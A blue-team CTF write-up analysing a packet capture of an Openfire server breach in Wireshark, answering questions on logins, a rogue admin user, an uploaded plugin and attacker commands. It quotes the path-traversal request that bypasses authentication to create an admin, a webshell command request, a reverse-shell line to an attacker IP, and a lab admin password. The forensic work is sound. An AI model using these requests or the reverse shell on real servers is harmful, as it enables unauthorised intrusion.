https://cyberdefenders.org/blueteam-ctf-challenges/openfire

Scenario:

>As a cybersecurity analyst, you are tasked with investigating a data breach targeting your organization’s Openfire messaging server. Attackers have exploited a vulnerability in the server, compromising sensitive communications and potentially exposing critical data. Your task is to analyze the provided network capture files using Wireshark. Identify evidence of the exploitation, trace the attacker’s actions, and uncover indicators of compromise.

**Q1: What is the CSRF token value for the first login request?**

I started with the basic Wireshark query I typically use to review a packet capture: 

```
(http.request or tls.handshake.type eq 1) and !(ssdp)
```

Here's an excerpt for the first ten rows (I've removed unnecessary TLS and QUIC rows for clarity), ordered by timestamp:

| Time      | Source         | Destination    | Protocol | Length | Info                                                         |
| --------- | -------------- | -------------- | -------- | ------ | ------------------------------------------------------------ |
| 57.461072 | 192.168.18.155 | 185.125.190.48 | HTTP     | 141    | GET / HTTP/1.1                                               |
| 68.406664 | 192.168.18.1   | 192.168.18.155 | HTTP     | 640    | GET /index.jsp HTTP/1.1                                      |
| 68.421954 | 192.168.18.1   | 192.168.18.155 | HTTP     | 657    | GET /login.jsp?url=%2Findex.jsp HTTP/1.1                     |
| 83.248991 | 192.168.18.160 | 34.107.221.82  | HTTP     | 349    | GET /success.txt?ipv4 HTTP/1.1                               |
| 83.249431 | 192.168.18.160 | 34.107.221.82  | HTTP     | 349    | GET /success.txt?ipv4 HTTP/1.1                               |
| 87.179985 | 192.168.18.155 | 192.168.18.1   | HTTP     | 862    | POST /login.jsp HTTP/1.1 (application/x-www-form-urlencoded) |
| 87.197924 | 192.168.18.1   | 192.168.18.155 | HTTP     | 676    | GET /index.jsp HTTP/1.1                                      |
| 88.448527 | 192.168.18.155 | 34.107.221.82  | HTTP     | 355    | GET /canonical.html HTTP/1.1                                 |
| 89.515017 | 192.168.18.155 | 34.107.221.82  | HTTP     | 372    | GET /success.txt?ipv4 HTTP/1.1                               |
| 89.657496 |                |                |          |        |                                                              |
| 92.758218 | 192.168.18.1   | 192.168.18.155 | HTTP     | 657    | GET /user-summary.jsp HTTP/1.1                               |

I follow the HTTP stream for the first packet with a POST request, which has the CSRF token for the first login request.

**Q2: What is the password of the first user who logged in?**

We can learn this by reviewing the Wireshark packet details pane section that reads `HTML Form URL Encoded: application/x-www-form-urlencoded` . Here's what that looks like, in part:

```
Frame 879: 862 bytes on wire (6896 bits), 862 bytes captured (6896 bits)
→ Ethernet II, Src: VMware_c0:00:08 (00:50:56:c0:00:08), Dst: VMware_c2:dd:f4 (00:0c:29:c2:dd:f4)
  → Internet Protocol Version 4, Src: 192.168.18.1, Dst: 192.168.18.155
    → Transmission Control Protocol, Src Port: 45220, Dst Port: 9090, Seq: 1, Ack: 1, Len: 808
      → Hypertext Transfer Protocol
        → POST /login.jsp HTTP/1.1\r\n
          → Host: 192.168.18.155:9090\r\n
          → Connection: keep-alive\r\n
          → Content-Length: 81\r\n
            → [Content length: 81]
          → Cache-Control: max-age=0\r\n
          → Upgrade-Insecure-Requests: 1\r\n
          → Origin: http://192.168.18.155:9090\r\n
          → Content-Type: application/x-www-form-urlencoded\r\n
          → User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0\r\n
          → Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n
          → Referer: http://192.168.18.155:9090/login.jsp\r\n
          → Accept-Encoding: gzip, deflate\r\n
          → Accept-Language: en-US,en;q=0.9,en-IN;q=0.8\r\n
          → Cookie: JSESSIONID=node@vie0vcha60j1zwmq44201iy82.node0; csrf=tmUJG9uym8oIOD\r\n
            → [Cookie pair: JSESSIONID=node@vie0vcha60j1zwmq44201iy82.node0]
            → [Cookie pair: csrf=tmUJG9uym8oIOD]
          → \r\n
          → [Response in frame: 884]
          → [Full request URI: http://192.168.18.155:9090/login.jsp]
          → File Data: 81 bytes
        → HTML Form URL Encoded: application/x-www-form-urlencoded
          → Form item: "login" = "true"
          → Form item: "csrf" = "tmUJG9uym8oIOD"
          → Form item: "username" = "admin"
          → Form item: "password" = "Admin@Passw0rd#@#"
```

**Q3: What is the 1st username that was created by the attacker?**

Following the Info column down the table, we eventually encounter a row that reads:

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=yGWwGRL3IKMHPFX&username=3536rr&name=&email=&password=dc0b2y&passwordConfirm=dc0b2y&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7 HTTP/1.1\r\n
```

**Q4: What is the username that the attacker used to login to the admin panel?**

Like Q1, I looked at the Info column for another occurrence of `POST /login.jsp HTTP/1.1\r\n`, then found the username in the packet details pane.

**Q5: What is the name of the plugin that the attacker uploaded?**

As this is an upload, I assumed it would involve a POST request. Going further down the table, I encountered a row with this information in the Info column:

```
POST /plugin-admin.jsp?uploadplugin&csrf=kp87ERFbIG5hdA6 HTTP/1.1\r\n
```

Reviewing the packet details pane section that starts with `MIME Multipart Media Encapsulation, Type: multipart/form-data`, I was able to find the answer. I leave this as an exercise for the reader.

**Q6: What is the first command that the user executed?**

Like before, I look for a POST request in the Info column and find:

```
POST /plugins/openfire-plugin/cmd.jsp?action=command HTTP/1.1\r\n
```

Digging into the packet details pane, there's a field below HTTP:

```
HTML Form URL Encoded: application/x-www-form-urlencoded
→ Form item: "command" = "whoami"
  → Key: command
  → Value: whoami
```

**Q7: Which tool did the attacker use to get a reverse shell?**

Descending through the capture, there's another command executed that looks a bit like this: <command> 

```
<command> 192.168.18.160 8888 -e /bin/bash
```

**Q8: Which command did the attacker execute on the server to check for network interfaces?**

I used the following query to isolate the netcat traffic:

```
ip.src == 192.168.18.160 and tcp.port == 8888
```

Then I followed the TCP stream:

```
whoami

root

id

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

uname -a

Linux b0704a182efe 6.5.0-44-generic #44~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue Jun 18 14:36:16 UTC 2 x86_64 Linux

ifconfig

eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1016 errors:0 dropped:0 overruns:0 frame:0
          TX packets:877 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:279686 (273.1 KiB)  TX bytes:974238 (951.4 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)


ls

extra
openfire
openfire.sh
openfirectl

cd //
ls

bin
data
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

cd root
ls
```
  

**Q9: What is the CVE of the vulnerability exploited?**

I learned this with a search engine query for "openfire cve". Based on the packet capture, I had suspected this was a vulnerability enabling unauthenticated users to perform privileged activities. Unfortunately, I lack a sophisticated understanding of Wireshark and web vulnerabilities, and am unable to identify the exploit/vulnerability relying on just a packet capture.
